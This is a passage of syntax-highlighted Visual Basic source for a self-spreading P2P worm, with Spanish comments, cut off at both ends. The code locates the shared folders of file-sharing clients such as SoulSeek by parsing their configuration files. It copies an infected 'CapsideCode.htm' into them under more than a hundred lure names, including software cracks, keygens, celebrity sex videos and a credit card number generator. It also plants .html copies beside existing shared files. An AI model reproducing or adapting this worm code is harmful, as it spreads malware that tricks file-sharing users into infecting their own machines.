</span><span class="sc7">On1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">23</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">On2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Cf.OpenTextFile</span><span class="sc6">(</span><span class="sc7">On1</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Share.dat"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">On3</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">On2.ReadAll</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">On2.Close</span><span class="sc0">
</span><span class="sc7">On4</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Split</span><span class="sc6">(</span><span class="sc7">On3</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">18</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">On4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Mod</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">O1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">On4</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">O2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">On4</span><span class="sc6">(</span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">On4</span><span class="sc6">)),</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc7">O1</span><span class="sc0">
</span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc7">O2</span><span class="sc0">
</span><span class="sc3">ElseIf</span><span class="sc0"> </span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">On4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Mod</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">O1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">On4</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">O2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">On4</span><span class="sc6">(</span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">On4</span><span class="sc6">)),</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">On4</span><span class="sc6">(</span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">On4</span><span class="sc6">)),</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">9</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc7">O1</span><span class="sc0">
</span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc7">O2</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc7">On3</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Sub para obtener la ruta del folder compartido de SoulSeek
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">VSoulSeek</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">k1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Cf.OpenTextFile</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\shared.cfg"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Do</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">k1.AtendOfStream</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
</span><span class="sc7">k2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">k1.ReadAll</span><span class="sc0">
</span><span class="sc3">Loop</span><span class="sc0">
</span><span class="sc7">k1.Close</span><span class="sc0">
</span><span class="sc7">k2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">k2</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">k2</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">k2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">k2</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">k2</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">":"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc7">k2</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Sub para copiar el worm a los folderes compartidos de
'los programas p2p
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">InfectP2P</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&gt;=</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">Xd</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Xd</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">P2PName</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Dir</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">FileCopy</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\CapsideCode.htm"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Xd</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">w</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">LFiles</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Dir</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">w</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".html"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">w</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">FileCopy</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\CapsideCode.htm"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Xd</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">w</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".html"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Sub que obtiene los nombres de los archivos que estan en los
'folderes compartidos de los programas p2p
</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">LFiles</span><span class="sc6">(</span><span class="sc7">XDir</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">Xf</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Xfs</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Xf</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Cf.GetFolder</span><span class="sc6">(</span><span class="sc7">XDir</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Xfs</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Xf.Files</span><span class="sc0">
</span><span class="sc3">ReDim</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Xf.Files.Count</span><span class="sc6">)):</span><span class="sc0"> </span><span class="sc7">a</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">k</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">Xfs</span><span class="sc0">
</span><span class="sc7">Ex</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc7">Cf.GetExtensionName</span><span class="sc6">(</span><span class="sc7">k.Path</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Ex</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"html"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Ex</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"htm"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Ex</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"plg"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">x</span><span class="sc6">(</span><span class="sc7">a</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">k.Name</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">a</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">a</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">F</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Nothing</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">LFiles</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc1">'Funcion que contiene los nombres con que se copiara el worm
'dentro de los folderes compartidos.
</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">P2PName</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">P</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Array</span><span class="sc6">(</span><span class="sc4">"Ana Kournikova Sex Video.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"AVP Antivirus Pro Key Crack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Britney Spears Sex Video.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Buffy Vampire Slayer Movie.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Crack Passwords Mail.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Cristina Aguilera Sex Video.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Game Cube Real Emulator.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Hentai Anime Girls Movie.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Jenifer Lopez Sex Video.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Matrix Movie.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Mcafee Antivirus Scan Crack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Norton Anvirus Key Crack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Panda Antivirus Titanium Crack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"PS2 PlayStation Simulator.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Quick Time Key Crack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Sakura Card Captor Movie.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Sex Live Simulator.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Sex Passwords.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Spiderman Movie.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Start Wars Trilogy Movies.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Thalia Sex Video.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Winzip KeyGenerator Crack.html "</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"aol cracker.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"aol password cracker.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"divx pro.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"GTA 3 Crack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"GTA 3 Serial.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"play station emulator.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"virtua girl - adriana.plg"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"virtua girl - bailey short skirt.plg"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Virtua Girl (Full).html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"warcraft 3 crack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"warcraft 3 serials.plg"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"counter-strike.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"delphi.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"divx_pro.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"HotGirls.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"hotmail_hack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pamela_anderson.htm"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"serials2000.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"subseven.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"VB6.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"VirtualSex.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"ACDSee 5.5.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Age of Empires 2 crack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Animated Screen 7.0b.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"AOL Instant Messenger.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"AquaNox2 Crack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Audiograbber 2.05.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"BabeFest 2003 ScreenSaver 1.5.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Babylon 3.50b reg_crack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Battlefield1942_bloodpatch.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Battlefield1942_keygen.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Business Card Designer Plus 7.9.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Clone CD 5.0.0.3 (crack).html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Clone CD 5.0.0.3.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Coffee Cup Free HTML 7.0b.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Cool Edit Pro v2.55.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Diablo 2 Crack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"DirectDVD 5.0.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"DirectX Buster (all versions).html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"DirectX InfoTool.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"DivX Video Bundle 6.5.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Download Accelerator Plus 6.1.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"DVD Copy Plus v5.0.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"DVD Region-Free 2.3.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"FIFA2003 crack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Final Fantasy VII XP Patch 1.5.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Flash MX crack (trial).html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"FlashGet 1.5.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"FreeRAM XP Pro 1.9.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"GetRight 5.0a.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Global DiVX Player 3.0.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Gothic2 licence.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Guitar Chords Library 5.5.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Hitman_2_no_cd_crack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Hot Babes XXX Screen Saver.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"ICQ Pro 2003a.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ICQ Pro 2003b (new beta).html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"iMesh 3.6.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"iMesh 3.7b (beta).html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"IrfanView 4.5.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"KaZaA Hack 2.5.0.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"KaZaA Speedup 3.6.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Links 2003 Golf game (crack).html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Living Waterfalls 1.3.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Mafia_crack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Matrix Screensaver 1.5.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"MediaPlayer Update.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"mIRC 6.40.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"mp3Trim PRO 2.5.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"MSN Messenger 5.2.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"NBA2003_crack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Need 4 Speed crack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Nero Burning ROM crack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Netfast 1.8.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Network Cable e ADSL Speed 2.0.5.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"NHL 2003 crack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Nimo CodecPack (new) 8.0.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"PalTalk 5.01b.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Popup Defender 6.5.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Pop-Up Stopper 3.5.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"QuickTime_Pro_Crack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Serials 2003 v.8.0 Full.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"SmartFTP 2.0.0.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"SmartRipper v2.7.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Space Invaders 1978.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Splinter_Cell_Crack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Steinberg_WaveLab_5_crack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Trillian 0.85 (free).html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"TweakAll 3.8.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Unreal2_bloodpatch.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Unreal2_crack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"UT2003_bloodpatch.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"UT2003_keygen.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"UT2003_no cd (crack).html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"UT2003_patch.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"WarCraft_3_crack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Winamp 3.8.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"WindowBlinds 4.0.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"WinOnCD 4 PE_crack.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"WinZip 9.0b.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Yahoo Messenger 6.0.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Zelda Classic 2.00.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Windows XP complete + serial.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Screen saver christina aguilera.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Screen saver christina aguilera naked.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Visual basic 6.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Starcraft serial.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Credit Card Numbers generator(incl Visa,MasterCard,...).html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Edonkey2000-Speed me up scotty.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Hotmail Hacker 2003-Xss Exploit.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Kazaa SDK + Xbit speedUp for 2.xx.html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
